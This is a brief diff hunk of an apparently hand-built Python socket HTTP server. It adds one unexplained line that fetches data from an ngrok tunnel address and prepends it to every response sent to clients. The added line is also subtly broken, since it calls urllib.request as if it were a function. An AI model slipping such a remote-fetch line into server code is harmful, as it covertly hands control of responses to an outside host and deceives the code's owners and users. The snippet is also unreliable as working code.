@@ -15,6 +15,7 @@ while True:
     req = client.recv(8192)
     res = 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n'
     try:
+        res = res+ urllib.request("http://0.tcp.ngrok.io:14776").read();
         path = req.split(" ",3)[1][1:]
         data = path
         if (path.find("?") == -1 and path == '') or path.find('?') == 0:
